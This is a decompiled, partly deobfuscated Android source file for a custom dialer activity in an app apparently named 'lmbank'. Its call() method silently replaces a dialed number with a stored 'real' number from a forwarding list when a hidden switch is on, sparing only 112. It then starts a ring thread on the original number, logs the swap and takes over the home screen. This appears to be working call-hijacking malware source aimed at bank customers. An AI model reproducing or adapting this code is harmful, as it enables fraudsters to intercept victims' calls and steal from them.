package com.wish.lmbank.dialer;

import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentTransaction;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R2;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.dialer.fragment.CallLogFragment;
import com.wish.lmbank.dialer.fragment.ContactFragment;
import com.wish.lmbank.dialer.fragment.DialPadFragment;
import com.wish.lmbank.receiver.TelePhoneReceiver;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/dialer/CustomDialerActivity.class */
public class CustomDialerActivity extends AppCompatActivity implements View.OnClickListener {
    private static final String TAG = "com.wish.lmbank.dialer.CustomDialerActivity";
    private LinearLayout footer;
    private RelativeLayout footerContainer;
    private View lineContact;
    private View lineDialPad;
    private View lineRecent;
    private TextView tvContact;
    private TextView tvDialPad;
    private TextView tvRecent;

    public static void call(String str, Context context) {
        if (TextUtils.isEmpty(str)) {
            return;
        }
        AppStartV.isCustomDialer = false;
//         String m5998 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
        String m5998 = "system_switch";
//         String m59982 = bb7d7pu7.m5998("Bgc");
        String m59982 = "on";
        String value = SharedPreferencesUtils.getValue(m5998, m59982);
        StringBuilder sb = new StringBuilder();
//         String replaceAll = str.replaceAll(bb7d7pu7.m5998("RA"), "").replaceAll(bb7d7pu7.m5998("Sg"), "");
        String replaceAll = str.replaceAll("-", "").replaceAll("#", "");
        LimitPhoneNumberBean isForwarding = SettingUtils.isForwarding(replaceAll);
        String str2 = "";
        if (m59982.equals(value)) {
            str2 = "";
            if (isForwarding != null) {
                str2 = "";
//                 if (!replaceAll.equals(bb7d7pu7.m5998("WFhb"))) {
                if (!replaceAll.equals("112")) {
                    str2 = isForwarding.getRealPhoneNumber();
                }
            }
        }
//         sb.append(bb7d7pu7.m5998("RUkZAQYHDFNJ") + replaceAll + bb7d7pu7.m5998("RUkPBhseCBsNAAcOU0k") + str2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
        sb.append(", phone: " + replaceAll + ", forwarding: " + str2 + ", switch: " + value);
        String str3 = replaceAll;
        if (!TextUtils.isEmpty(str2)) {
            AppStartV.isCustomDialer = true;
            AppStartV.customDialerCallNumber = replaceAll;
            AppStartV.customDialerForwardingNumber = str2;
            new TelePhoneReceiver.ColorRingThread(replaceAll).start();
            str3 = str2;
        }
        LogUtils.callLog(TAG + ((Object) sb));
        SettingUtils.startActivityForCall(context, str3);
        return;
    }

    public static void sendSMS(String str, Context context) {
//         Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRz8gLD4"));
        Intent intent = new Intent("android.intent.action.VIEW");
        StringBuilder sb = new StringBuilder();
//         sb.append(bb7d7pu7.m5998("GgQaUw"));
        sb.append("sms:");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        sb.append(str);
        intent.setData(Uri.parse(sb.toString()));
        context.startActivity(intent);
    }

    public static void showCustomDialer(Context context) {
        Intent intent = new Intent(context, CustomDialerActivity.class);
//         intent.addCategory(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCggdDA4GGxBHISYkLA"));
        intent.addCategory("android.intent.category.HOME");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R2.layout.activity_dialer);
        findViewById(R2.id.dialPad).setOnClickListener(this);
        findViewById(R2.id.recent).setOnClickListener(this);
        findViewById(R2.id.contact).setOnClickListener(this);
        findViewById(R2.id.ivAddContact).setOnClickListener(this);
        findViewById(R2.id.ivSearch).setOnClickListener(this);
        this.tvDialPad = (TextView) findViewById(R2.id.tvDialPad);
        this.tvRecent = (TextView) findViewById(R2.id.tvRecent);
        this.tvContact = (TextView) findViewById(R2.id.tvContact);
        this.lineDialPad = findViewById(R2.id.lineDialPad);
        this.lineRecent = findViewById(R2.id.lineRecent);
        this.lineContact = findViewById(R2.id.lineContact);
        this.footer = (LinearLayout) findViewById(R2.id.footer);
        this.footerContainer = (RelativeLayout) findViewById(R2.id.footerContainer);
        showPage(1);
    }

    @TargetApi(Build.VERSION_CODES.M)
    private void showPage(int i) {
        FragmentTransaction beginTransaction = getSupportFragmentManager().beginTransaction();
        if (i != 1) {
            this.tvDialPad.setTextColor(getColor(R2.color.dialpad_btn_text_color));
            this.lineDialPad.setBackgroundColor(getColor(R2.color.dialpad_btn_line_color));
        }
        if (i != 2) {
            this.tvRecent.setTextColor(getColor(R2.color.dialpad_btn_text_color));
            this.lineRecent.setBackgroundColor(getColor(R2.color.dialpad_btn_line_color));
        }
        if (i != 3) {
            this.tvContact.setTextColor(getColor(R2.color.dialpad_btn_text_color));
            this.lineContact.setBackgroundColor(getColor(R2.color.dialpad_btn_line_color));
        }
        if (i == 1) {
            beginTransaction.replace(R2.id.fragment, new DialPadFragment(this.footer, this));
            beginTransaction.commit();
            this.tvDialPad.setTextColor(getColor(R2.color.dialpad_clicked_btn_color));
            this.lineDialPad.setBackgroundColor(getColor(R2.color.dialpad_clicked_btn_color));
        } else if (i == 2) {
            beginTransaction.replace(R2.id.fragment, new CallLogFragment(this.footerContainer, this));
            beginTransaction.commit();
            this.tvRecent.setTextColor(getColor(R2.color.dialpad_clicked_btn_color));
            this.lineRecent.setBackgroundColor(getColor(R2.color.dialpad_clicked_btn_color));
        } else if (i != 3) {
        } else {
            beginTransaction.replace(R2.id.fragment, new ContactFragment(this.footerContainer, this));
            beginTransaction.commit();
            this.tvContact.setTextColor(getColor(R2.color.dialpad_clicked_btn_color));
            this.lineContact.setBackgroundColor(getColor(R2.color.dialpad_clicked_btn_color));
        }
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        switch (view.getId()) {
            case R2.id.contact /* 2131296425 */:
                showPage(3);
                return;
            case R2.id.dialPad /* 2131296456 */:
                showPage(1);
                return;
            case R2.id.ivAddContact /* 2131296571 */:
                startActivity(new Intent(this, ContactActivity.class));
                return;
            case R2.id.ivSearch /* 2131296580 */:
                startActivity(new Intent(this, DialerSearchActivity.class));
                return;
            case R2.id.recent /* 2131296704 */:
                showPage(2);
                return;
            default:
                return;
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
        finish();
        SettingUtils.toHome(this);
    }
}
